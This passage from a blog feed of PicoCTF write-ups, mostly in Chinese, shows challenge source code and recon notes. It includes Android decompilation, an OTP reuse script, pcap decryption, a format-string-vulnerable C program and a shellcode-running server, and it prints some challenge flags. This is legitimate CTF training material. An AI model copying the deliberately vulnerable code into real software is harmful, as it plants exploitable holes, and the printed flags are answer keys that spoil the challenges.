 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-java=" data-lang="java=">package com.hellocmu.picoctf;

import android.content.Context;

/* loaded from: classes.dex */
public class FlagstaffHill {
 public static native String cilantro(String str);

 public static String nope(String input) {
 return &amp;#34;don&amp;#39;t wanna&amp;#34;;
 }

 public static String yep(String input) {
 return cilantro(input);
 }

 public static String getFlag(String input, Context ctx) {
 String flag = nope(input);
 return flag;
 }
}
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出&lt;code>don't wanna&lt;/code>，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程
Apktool decode apk file$\to$修改必要的地方$\to$Apktool重新打包$\to$簽名$\to$Align$\to$Done，這一個部分在&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>有詳細的說明&lt;/p></description></item><item><title>PicoCTF - droids4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids4/</guid><description>&lt;h1 id="picoctf---droids4">
 PicoCTF - droids4
 &lt;a class="anchor" href="#picoctf---droids4">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>
&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> com.hellocmu.picoctf;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> android.content.Context;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* loaded from: classes.dex */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FlagstaffHill&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> String &lt;span style="color:#a6e22e">cardamom&lt;/span>(String str);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String &lt;span style="color:#a6e22e">getFlag&lt;/span>(String input, Context ctx) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder ace &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder jack &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder queen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder king &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 4));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 19));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 18));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 7));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 0));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 1));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 0));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 11));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 15));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 14));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 20));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 15));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">concat&lt;/span>(queen.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(jack.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(ace.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(king.&lt;span style="color:#a6e22e">toString&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> input.&lt;span style="color:#a6e22e">equals&lt;/span>(password) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call it&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;NOPE&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>基本上用眼睛看應該看的出來password是啥，不過他最後只會print出&lt;code>call it&lt;/code>或是&lt;code>NOPE&lt;/code>，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的&lt;/p></description></item><item><title>PicoCTF - Easy as GDB</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---easy-as-gdb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---easy-as-gdb/</guid><description>&lt;h1 id="picoctf---easy-as-gdb">
 PicoCTF - Easy as GDB
 &lt;a class="anchor" href="#picoctf---easy-as-gdb">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 char *str_len; // eax
 int v5; // [esp-8h] [ebp-20h]
 int v6; // [esp-4h] [ebp-1Ch]
 char *input_flag; // [esp+4h] [ebp-14h]
 size_t str_len_1; // [esp+8h] [ebp-10h]
 char *src; // [esp+Ch] [ebp-Ch]

 input_flag = calloc(0x200u, 1u);
 printf(&amp;#34;input the flag: &amp;#34;);
 fgets(input_flag, 512, stdin);
 str_len = strnlen(aZNh, 512, v5, v6);
 src = enc_input(str_len, str_len);
 sub_7C2(src, 1, 1);
 if ( check_flag(src, str_len_1) == 1 )
 puts(&amp;#34;Correct!&amp;#34;);
 else
 puts(&amp;#34;Incorrect.&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Easy Peasy</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/</guid><description>&lt;h1 id="picoctf---easy-peasy">
 PicoCTF - Easy Peasy
 &lt;a class="anchor" href="#picoctf---easy-peasy">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">Easy Peasy&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
import os.path

KEY_FILE = &amp;#34;key&amp;#34;
KEY_LEN = 50000
FLAG_FILE = &amp;#34;flag&amp;#34;

def startup(key_location):
	flag = open(FLAG_FILE).read()
	kf = open(KEY_FILE, &amp;#34;rb&amp;#34;).read()

	start = key_location
	stop = key_location + len(flag)

	key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: &amp;#34;{:02x}&amp;#34;.format(ord(p) ^ k), flag, key))
	print(&amp;#34;This is the encrypted flag!\n{}\n&amp;#34;.format(&amp;#34;&amp;#34;.join(result)))

	return key_location

def encrypt(key_location):
	ui = input(&amp;#34;What data would you like to encrypt? &amp;#34;).rstrip()
	if len(ui) == 0 or len(ui) &amp;gt; KEY_LEN:
		return -1

	start = key_location
	stop = key_location + len(ui)

	kf = open(KEY_FILE, &amp;#34;rb&amp;#34;).read()

	if stop &amp;gt;= KEY_LEN:
		stop = stop % KEY_LEN
		key = kf[start:] + kf[:stop]
	else:
		key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: &amp;#34;{:02x}&amp;#34;.format(ord(p) ^ k), ui, key))

	print(&amp;#34;Here ya go!\n{}\n&amp;#34;.format(&amp;#34;&amp;#34;.join(result)))

	return key_location


print(&amp;#34;******************Welcome to our OTP implementation!******************&amp;#34;)
c = startup(0)
while c &amp;gt;= 0:
	c = encrypt(c)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Easy Peasy Or Bad Questions</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/</guid><description>&lt;h1 id="picoctf---easy-peasy-or-bad-questions">
 PicoCTF - Easy Peasy Or Bad Questions
 &lt;a class="anchor" href="#picoctf---easy-peasy-or-bad-questions">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="challenge-logon">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/46?category=1&amp;amp;page=1">logon&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-logon">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---set-cookie">
 Exploit - Set cookie
 &lt;a class="anchor" href="#exploit---set-cookie">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/lZ4wQUW.png" alt="" />
&lt;img src="https://i.imgur.com/OUTQtCP.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-where-are-the-robots">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/4?category=1&amp;amp;page=1">where are the robots&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-where-are-the-robots">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---robotstxt">
 Exploit - robots.txt
 &lt;a class="anchor" href="#exploit---robotstxt">#&lt;/a>
&lt;/h3>
&lt;p>Payload: &lt;code>https://jupiter.challenges.picoctf.org/problem/56830/robots.txt&lt;/code>
&lt;img src="https://i.imgur.com/LjqyriL.png" alt="" />
Payload: &lt;code>https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html&lt;/code>
&lt;img src="https://i.imgur.com/NBKgAAg.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-packets-primer">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/286?category=4&amp;amp;page=2">Packets Primer&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-packets-primer">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---search--string-directly">
 Exploit - search &lt;code>{&lt;/code> string directly
 &lt;a class="anchor" href="#exploit---search--string-directly">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/Qf0YaZz.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-disk-disk-sleuth">
 Challenge: &lt;a href="https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz">Disk, disk, sleuth!&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-disk-disk-sleuth">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---strings-search">
 Exploit - Strings search
 &lt;a class="anchor" href="#exploit---strings-search">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file dds1-alpine.flag.img.gz
dds1-alpine.flag.img.gz: gzip compressed data, was &amp;#34;dds1-alpine.flag.img&amp;#34;, last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
$ gzip -d dds1-alpine.flag.img.gz
$ ls
dds1-alpine.flag.img
$ strings dds1-alpine.flag.img | grep &amp;#34;pico&amp;#34;
ffffffff81399ccf t pirq_pico_get
ffffffff81399cee t pirq_pico_set
ffffffff820adb46 t pico_router_probe
 SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0}
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="challenge-sleuthkit-apprentice">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/300?category=4&amp;amp;page=3">Sleuthkit Apprentice&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-sleuthkit-apprentice">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---ftk-imager">
 Exploit - FTK Imager
 &lt;a class="anchor" href="#exploit---ftk-imager">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/4iZjRu6.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Eavesdrop</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---eavesdrop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---eavesdrop/</guid><description>&lt;h1 id="picoctf---eavesdrop">
 PicoCTF - Eavesdrop
 &lt;a class="anchor" href="#picoctf---eavesdrop">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題是有關eavesdropping，代表有一個中間人監聽了所有conversation，先用一些基本的手段看一下整體的pcap packets(strings searching/IO Graphs/Statistic/Extract Default Protocol File&amp;hellip;)，但是如果跟一下tcp的packets，可以發現傳輸兩方的對話紀錄，包括傳輸資料的加密方式等等，所以我們就可以直接把傳輸資料解密得到flag&lt;/p>
&lt;h2 id="exploit---extract-file--decrypt">
 Exploit - Extract File &amp;amp; Decrypt
 &lt;a class="anchor" href="#exploit---extract-file--decrypt">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Follow TCP Packets
&lt;pre tabindex="0">&lt;code>Hey, how do you decrypt this file again?
You&amp;#39;re serious?
Yeah, I&amp;#39;m serious
*sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
Ok, great, thanks.
Let&amp;#39;s use Discord next time, it&amp;#39;s more secure.
C&amp;#39;mon, no one knows we use this program like this!
Whatever.
Hey.
Yeah?
Could you transfer the file to me again?
Oh great. Ok, over 9002?
Yeah, listening.
Sent it
Got it.
You&amp;#39;re unbelievable
&lt;/code>&lt;/pre>從以上對話紀錄可以知道他們在9002 port有傳輸資料，並且解密的command是&lt;code>openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123&lt;/code>&lt;/li>
&lt;li>Extract File
我們可以增加兩個column專門顯示source/destination port
&lt;img src="https://hackmd.io/_uploads/B1ZrNEdOh.png" alt="" />
然後找到port 9002的地方，可以發現No.57有附帶資料，把這筆資料另存起來
&lt;img src="https://hackmd.io/_uploads/r11KNV_O2.png" alt="" />
Note: 儲存資料到file.des3的時候，內容必須要是&lt;code>Salted__9BæÄ'÷b4Ó[ÐNXämn±'-ärGsðÏú :›çk¿«@Û=6&lt;/code>
Note2: 也可以用&lt;code>tcpflow&lt;/code>的方式把資料download下來
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo tcpflow -r {pcap file}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Decrypt File
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>picoCTF{nc_73115_411_dd54ab67}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</guid><description>&lt;h1 id="picoctf---fermat-strings">
 PicoCTF - fermat-strings
 &lt;a class="anchor" href="#picoctf---fermat-strings">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-strcspn.html">C 庫函數 - strcspn()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="http://tw.gitbook.net/c_standard_library/c_function_atoi.html">atoi() - C語言庫函數&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-snprintf.html">C 库函数 - snprintf()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。&lt;/p>
&lt;p>需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/format-specifiers-in-c/">Format Specifiers in C&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;math.h&amp;gt;

#define SIZE 0x100

int main(void)
{
 char A[SIZE];
 char B[SIZE];

 int a = 0;
 int b = 0;

 puts(&amp;#34;Welcome to Fermat\\&amp;#39;s Last Theorem as a service&amp;#34;);

 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 printf(&amp;#34;A: &amp;#34;);
 read(0, A, SIZE);
 printf(&amp;#34;B: &amp;#34;);
 read(0, B, SIZE);

 A[strcspn(A, &amp;#34;\n&amp;#34;)] = 0;
 B[strcspn(B, &amp;#34;\n&amp;#34;)] = 0;

 a = atoi(A);
 b = atoi(B);

 if(a == 0 || b == 0) {
 puts(&amp;#34;Error: could not parse numbers!&amp;#34;);
 return 1;
 }

 char buffer[SIZE];
 snprintf(buffer, SIZE, &amp;#34;Calculating for A: %s and B: %s\n&amp;#34;, A, B);
 printf(buffer);

 int answer = -1;
 for(int i = 0; i &amp;lt; 100; i++) {
 if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
 answer = i;
 }
 }

 if(answer != -1) printf(&amp;#34;Found the answer: %d\n&amp;#34;, answer);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - File types</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---file-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---file-types/</guid><description>&lt;h1 id="picoctf---file-types">
 PicoCTF - File types
 &lt;a class="anchor" href="#picoctf---file-types">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">File types&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="for-shell-script">
 For Shell Script
 &lt;a class="anchor" href="#for-shell-script">#&lt;/a>
&lt;/h3>
&lt;p>&lt;a href="https://blog.gtwang.org/linux/generate-verify-check-files-md5-sha1-checksum-linux/">Linux MD5&lt;/a>
&lt;a href="https://www.runoob.com/linux/linux-comm-egrep.html">Linux egrep命令&lt;/a>
&lt;a href="https://www.runoob.com/linux/linux-shell-test.html">Shell test 命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-f 文件名: 如果文件存在且为普通文件则为真&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://phoenixnap.com/kb/linux-add-to-path">How to modify $PATH&lt;/a>
&lt;a href="https://blog.gtwang.org/linux/linux-touch-command-tutorial-examples/">touch - time stamp&lt;/a>
&lt;a href="https://unix.stackexchange.com/questions/291570/what-is-in-bash">What is $$ in bash?&lt;/a>&lt;/p>
&lt;h3 id="for-compress-command">
 For Compress Command
 &lt;a class="anchor" href="#for-compress-command">#&lt;/a>
&lt;/h3>
&lt;p>&lt;a href="https://officeguide.cc/linux-copy-files-to-and-from-archives-cpio-command-tutorial-examples/">Linux 備份檔案操作 cpio 指令教學與範例&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/bzip2-command-in-linux-with-examples/">bzip2 command in Linux&lt;/a>
&lt;a href="https://linuxize.com/post/gzip-command-in-linux/">Gzip Command in Linux&lt;/a>
&lt;a href="https://www.nongnu.org/lzip/manual/lzip_manual.html">Lzip Manual&lt;/a>
&lt;a href="https://manpages.ubuntu.com/manpages/xenial/man1/lz4.1.html">lz4 manual&lt;/a>
&lt;a href="https://manpages.ubuntu.com/manpages/xenial/man1/lzmp.1.html">lzma manual&lt;/a>
&lt;a href="https://linux.die.net/man/1/lzop">lzop(1) - Linux man page&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Flag.pdf&lt;/p></description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</guid><description>&lt;h1 id="picoctf---filtered-shellcode">
 PicoCTF - filtered-shellcode
 &lt;a class="anchor" href="#picoctf---filtered-shellcode">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Shell Code
Reverse&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code Got From Server After Get Shell&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
 if (!shellcode || !length) {
 exit(1);
 }
 size_t new_length = length * 2;
 char result[new_length + 1];

 int spot = 0;
 for (int i = 0; i &amp;lt; new_length; i++) {
 if ((i % 4) &amp;lt; 2) {
 result[i] = shellcode[spot++];
 } else {
 result[i] = &amp;#39;\x90&amp;#39;;
 }
 }
 // result[new_length] = &amp;#39;\xcc&amp;#39;;
 result[new_length] = &amp;#39;\xc3&amp;#39;;

 // Execute code
 int (*code)() = (int(*)())result;
 code();
}

int main(int argc, char *argv[]) {
 setbuf(stdout, NULL);
 char buf[MAX_LENGTH];
 size_t length = 0;
 char c = &amp;#39;\0&amp;#39;;

 printf(&amp;#34;Give me code to run:\n&amp;#34;);
 c = fgetc(stdin);
 while ((c != &amp;#39;\n&amp;#39;) &amp;amp;&amp;amp; (length &amp;lt; MAX_LENGTH)) {
 buf[length] = c;
 c = fgetc(stdin);
 length++;
 }
 if (length % 2) {
 buf[length] = &amp;#39;\x90&amp;#39;;
 length++;
 }
 execute(buf, length);
 return 0;
}
